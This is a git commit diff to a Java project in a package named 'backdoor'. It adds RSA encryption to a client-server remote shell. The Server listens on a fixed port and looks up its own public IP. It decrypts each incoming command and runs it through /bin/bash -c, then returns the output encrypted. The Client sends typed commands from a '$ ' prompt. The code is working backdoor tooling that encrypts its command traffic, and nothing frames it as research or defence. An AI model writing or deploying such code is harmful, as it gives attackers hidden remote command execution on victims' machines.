c55581413b213fcdc4c27ca3b2ff7d727dcd3de3
PatrickLeonardo <ticklf7@gmail.com>
2022-12-11 23:41:15 -0300

    Cryptography append

--- src/main/java/backdoor/java/Client.java
+++ src/main/java/backdoor/java/Client.java
@@ -1,10 +1,38 @@
 package backdoor.java;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 
 import java.net.Socket;
+
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+
+import java.security.InvalidKeyException;
+import java.security.KeyFactory;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.security.PrivateKey;
+import java.security.PublicKey;
+import java.security.spec.EncodedKeySpec;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.PKCS8EncodedKeySpec;
+import java.security.spec.X509EncodedKeySpec;
+
+import java.util.Base64;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+
 
 public class Client {
 
@@ -16,21 +44,23 @@ public class Client {
         
         try{
 
-            ObjectInputStream entrada = new ObjectInputStream(client.getInputStream());
-            ObjectOutputStream exit = new ObjectOutputStream(client.getOutputStream());                
+            ObjectInputStream inputStream = new ObjectInputStream(client.getInputStream());
+            ObjectOutputStream outputStream = new ObjectOutputStream(client.getOutputStream());  
+            File privateKeyFile = new File("privateKeyFile.txt");        
+            File publicKeyFile = new File("publicKeyFile.txt");
 
             while(client.isConnected()){
 
-                String mensagem = (String)entrada.readObject();
-                System.out.println(mensagem);
+                String decodedMessage = backdoor.java.Cryptography.decryptMesage((String)inputStream.readObject(), privateKeyFile);
+                System.out.println("\n" + decodedMessage);
                     
-                String msg = System.console().readLine("$ ");
-                exit.writeObject(msg);
+                String outputMessage = System.console().readLine("$ ");
+                outputStream.writeObject(backdoor.java.Cryptography.encryptMessage(outputMessage, publicKeyFile));
 
-                if("exit".equals(msg)){
+                if("exit".equals(outputMessage)){
 
-                    exit.flush();
-                    exit.close(); 
+                    outputStream.flush();
+                    outputStream.close(); 
                     client.close();
                     
                     break;
@@ -38,9 +68,94 @@ public class Client {
                 
             }
 
-        } catch (Exception e) {
-            e.printStackTrace();
+        } catch (Exception exception) {
+            exception.printStackTrace();
         }
+
+    }
+
+}
+
+class Cryptography {
+    
+    public static void createRSAKeys(File publicKeyFile, File privateKeyFile)
+    throws NoSuchAlgorithmException, FileNotFoundException, IOException {
+
+        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
+        generator.initialize(2048);
+        KeyPair pair = generator.genKeyPair();
+        
+        try(FileOutputStream fileOutputStream = new FileOutputStream(publicKeyFile)){
+            fileOutputStream.write(pair.getPublic().getEncoded());
+        }
+        
+        try(FileOutputStream fileOutputStream = new FileOutputStream(privateKeyFile)){
+            fileOutputStream.write(pair.getPrivate().getEncoded());
+        }
+
+    }
+
+    public static PublicKey readRSAPublicKey(File KeyFile) 
+    throws IOException, NoSuchAlgorithmException, InvalidKeySpecException {
+
+        byte[] publicKeyBytes = Files.readAllBytes(KeyFile.toPath());
+        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+        EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);
+        return keyFactory.generatePublic(publicKeySpec);
+
+    }
+
+    public static PrivateKey readRSAPrivateKey(File KeyFile)
+    throws NoSuchAlgorithmException, IOException, InvalidKeySpecException {
+
+        byte[] privateKeyBytes = Files.readAllBytes(KeyFile.toPath());
+        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+        EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyBytes);
+        return keyFactory.generatePrivate(privateKeySpec);
+
+    }
+
+    public static String encryptMessage(String message, File publicKeyFile) 
+    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {
+
+        Cipher encryptCipher = Cipher.getInstance("RSA");
+        encryptCipher.init(Cipher.ENCRYPT_MODE, readRSAPublicKey(publicKeyFile));
+        byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);
+        byte[] encryptMessageBytes = encryptCipher.doFinal(messageBytes);
+        return Base64.getEncoder().encodeToString(encryptMessageBytes);
+
+    }
+
+
+    public static String decryptMesage(String encryptMessage, File privateKeyFile)
+    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {
+
+        Cipher decryptCipher = Cipher.getInstance("RSA");
+        decryptCipher.init(Cipher.DECRYPT_MODE, readRSAPrivateKey(privateKeyFile));
+        byte[] decryptMessageBytes = decryptCipher.doFinal(Base64.getDecoder().decode(encryptMessage));
+        return new String(decryptMessageBytes, StandardCharsets.UTF_8);
+
+    }
+
+    public static String hashMessage(String message) throws NoSuchAlgorithmException{
+        
+        final MessageDigest digest = MessageDigest.getInstance("SHA3-256");
+        final byte[] hashBytes = digest.digest(message.getBytes(StandardCharsets.UTF_8));
+        return bytesToHex(hashBytes);
+    
+    }
+
+    private static String bytesToHex(byte[] hash){
+
+        StringBuilder hexString = new StringBuilder(2 * hash.length);
+        for (byte b : hash){
+            String hex = Integer.toHexString(0xff & b);
+            if (hex.length() == 1){
+                hexString.append('0');
+            }
+            hexString.append(hex);
+        }
+        return hexString.toString();
 
     }
 
--- src/main/java/backdoor/java/Server.java
+++ src/main/java/backdoor/java/Server.java
@@ -5,6 +5,7 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.BufferedReader;
 import java.io.Closeable;
+import java.io.File;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 
@@ -16,15 +17,45 @@ import java.net.HttpURLConnection;
 import java.util.ArrayList;
 import java.util.logging.Logger;
 
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+
+import java.security.InvalidKeyException;
+import java.security.KeyFactory;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.security.PrivateKey;
+import java.security.PublicKey;
+import java.security.spec.EncodedKeySpec;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.PKCS8EncodedKeySpec;
+import java.security.spec.X509EncodedKeySpec;
+
+import java.util.Base64;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+
+
 public class Server {
     
     public static void main(String[] args) throws IOException {
 
-        final int PORT = Integer.parseInt(args[0]);
+        // final int PORT = Integer.parseInt(args[0]);
+         final int PORT = 1234;
 
         URL url_name = new URL("http://checkip.amazonaws.com");
         HttpURLConnection conection = (HttpURLConnection) url_name.openConnection();
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(conection.getInputStream()));
+        File publicKeyFile = new File("publicKeyFile.txt");
+        File privateKeyFile = new File("privateKeyFile.txt"); 
         
         ServerSocket server = new ServerSocket(PORT);
         System.out.println("\nServidor iniciado: " + bufferedReader.readLine() + ": " + PORT);
@@ -37,10 +68,48 @@ public class Server {
                 Socket client = server.accept();
                 System.out.println("Client conectado: " + client.getInetAddress().getHostAddress() + "\n");
             
-                ObjectOutputStream exit = new ObjectOutputStream(client.getOutputStream());
-                new ClientThread(client, exit).start();
+                ObjectOutputStream outputStream = new ObjectOutputStream(client.getOutputStream());
+        
+                Thread thread = new Thread(() -> {
 
-                exit.writeObject("\nHello from Server!\n");
+                    try {
+            
+                        ObjectInputStream inputStream = new ObjectInputStream(client.getInputStream());
+                        
+                        while(client.isConnected()){
+                            
+                            String decodedCommand = Cryptography.decryptMesage((String)inputStream.readObject(), privateKeyFile);
+                            System.out.println("Client: " + decodedCommand + "\n");
+                            
+                            String log = Eval.executeCommand(decodedCommand);
+                            String encodedMessage = Cryptography.encryptMessage(log, publicKeyFile);
+                            
+                            try {
+                                outputStream.writeObject(encodedMessage);    
+                            } catch (Exception exception) {
+                                exception.printStackTrace();
+                            }
+            
+                            if("exit".equals(decodedCommand)) {
+            
+                                System.out.println("Cliente desconectado!\n");
+                                
+                                inputStream.close();
+                                outputStream.flush();
+                                client.close();
+                                
+                                break;
+                            }
+            
+                        }
+                    }
+                    catch(Exception exception) { exception.printStackTrace(); }                    
+
+                }, "client");
+                thread.start();
+
+
+                outputStream.writeObject(Cryptography.encryptMessage("\nHello from Server!\n", publicKeyFile));
                 
             } catch (Exception exception){ exception.printStackTrace(); break; }
         }
@@ -51,62 +120,14 @@ public class Server {
 
 }
 
-class ClientThread extends Thread {
-
-    private Socket client;
-    private ObjectOutputStream exit;
-
-    public ClientThread(Socket client, ObjectOutputStream exit){
-        this.client = client;
-        this.exit = exit;
-    }
-    
-    public void run() {
-
-        try {
-            
-            ObjectInputStream entrada = new ObjectInputStream(client.getInputStream());
-
-            while(client.isConnected()){
-                
-                String msg = (String)entrada.readObject();
-                System.out.println("Client: " + msg + "\n");
-                
-                String log = new Eval().executeCommand(msg);
-                
-                try {
-                    this.exit.writeObject("\n" + log);    
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-
-                if("exit".equals(msg)) {
-
-                    System.out.println("Cliente desconectado!\n");
-                    
-                    entrada.close();
-                    exit.flush();
-                    client.close();
-                    
-                    break;
-                }
-
-            }
-        }
-        catch(Exception exception) { exception.printStackTrace(); }
-    
-    }
-    
-}
-
 class Eval {
 
     private static final Logger log = Logger.getLogger(Eval.class.getName());
 
-    public String executeCommand(final String command) throws IOException {
+    public static String executeCommand(final String command) throws IOException {
 
         final ArrayList<String> commands = new ArrayList<String>();
-        commands.add("/bin/zsh");
+        commands.add("/bin/bash");
         commands.add("-c");
         commands.add(command);
 
@@ -135,7 +156,7 @@ class Eval {
         } finally { secureClose(bufferedReader); }
     }
 
-    private void secureClose(final Closeable resource){
+    private static void secureClose(final Closeable resource){
         try{
             if(resource != null){
                 resource.close();
@@ -143,6 +164,91 @@ class Eval {
         } catch (IOException ioException){
             log.severe("Erro: " + ioException.getMessage());
         }
+    }
+
+}
+
+class Cryptography {
+    
+    public static void createRSAKeys(File publicKeyFile, File privateKeyFile)
+    throws NoSuchAlgorithmException, FileNotFoundException, IOException {
+
+        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
+        generator.initialize(2048);
+        KeyPair pair = generator.genKeyPair();
+        
+        try(FileOutputStream fileOutputStream = new FileOutputStream(publicKeyFile)){
+            fileOutputStream.write(pair.getPublic().getEncoded());
+        }
+        
+        try(FileOutputStream fileOutputStream = new FileOutputStream(privateKeyFile)){
+            fileOutputStream.write(pair.getPrivate().getEncoded());
+        }
+
+    }
+
+    public static PublicKey readRSAPublicKey(File KeyFile) 
+    throws IOException, NoSuchAlgorithmException, InvalidKeySpecException {
+
+        byte[] publicKeyBytes = Files.readAllBytes(KeyFile.toPath());
+        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+        EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(publicKeyBytes);
+        return keyFactory.generatePublic(publicKeySpec);
+
+    }
+
+    public static PrivateKey readRSAPrivateKey(File KeyFile)
+    throws NoSuchAlgorithmException, IOException, InvalidKeySpecException {
+
+        byte[] privateKeyBytes = Files.readAllBytes(KeyFile.toPath());
+        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+        EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(privateKeyBytes);
+        return keyFactory.generatePrivate(privateKeySpec);
+
+    }
+
+    public static String encryptMessage(String message, File publicKeyFile) 
+    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {
+
+        Cipher encryptCipher = Cipher.getInstance("RSA");
+        encryptCipher.init(Cipher.ENCRYPT_MODE, readRSAPublicKey(publicKeyFile));
+        byte[] messageBytes = message.getBytes(StandardCharsets.UTF_8);
+        byte[] encryptMessageBytes = encryptCipher.doFinal(messageBytes);
+        return Base64.getEncoder().encodeToString(encryptMessageBytes);
+
+    }
+
+
+    public static String decryptMesage(String encryptMessage, File privateKeyFile)
+    throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidKeySpecException, IOException, IllegalBlockSizeException, BadPaddingException {
+
+        Cipher decryptCipher = Cipher.getInstance("RSA");
+        decryptCipher.init(Cipher.DECRYPT_MODE, readRSAPrivateKey(privateKeyFile));
+        byte[] decryptMessageBytes = decryptCipher.doFinal(Base64.getDecoder().decode(encryptMessage));
+        return new String(decryptMessageBytes, StandardCharsets.UTF_8);
+
+    }
+
+    public static String hashMessage(String message) throws NoSuchAlgorithmException{
+        
+        final MessageDigest digest = MessageDigest.getInstance("SHA3-256");
+        final byte[] hashBytes = digest.digest(message.getBytes(StandardCharsets.UTF_8));
+        return bytesToHex(hashBytes);
+    
+    }
+
+    private static String bytesToHex(byte[] hash){
+
+        StringBuilder hexString = new StringBuilder(2 * hash.length);
+        for (byte b : hash){
+            String hex = Integer.toHexString(0xff & b);
+            if (hex.length() == 1){
+                hexString.append('0');
+            }
+            hexString.append(hex);
+        }
+        return hexString.toString();
+
     }
 
 }
